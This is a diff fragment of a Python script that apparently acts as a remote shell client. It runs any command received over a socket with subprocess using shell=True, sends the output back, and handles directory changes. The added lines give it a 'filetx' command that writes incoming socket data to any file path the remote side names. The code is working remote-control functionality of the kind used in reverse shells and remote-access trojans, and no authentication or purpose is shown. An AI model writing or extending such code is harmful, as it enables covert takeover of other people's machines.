@@ -20,6 +20,17 @@ while True:
 						c.send(str.encode(" "))
 					except FileNotFoundError:
 						c.send(str("No directory of name \'%s\' exists"%(comm[3:]),"utf-8"))
+				elif comm[:6] == 'filetx':
+					c.send(str.encode('T'))
+					f=open(comm[7:],'w')
+					while True:
+						msg=c.recv(4196).decode()
+						if msg[-7:]!='filetxd':
+							f.write(msg)
+						else:
+							f.write(msg[:-7])
+							break
+					f.close()
 				else:
 					cmd = subprocess.Popen(comm,shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
 					output= str(cmd.stdout.read() + cmd.stderr.read(),"utf-8")
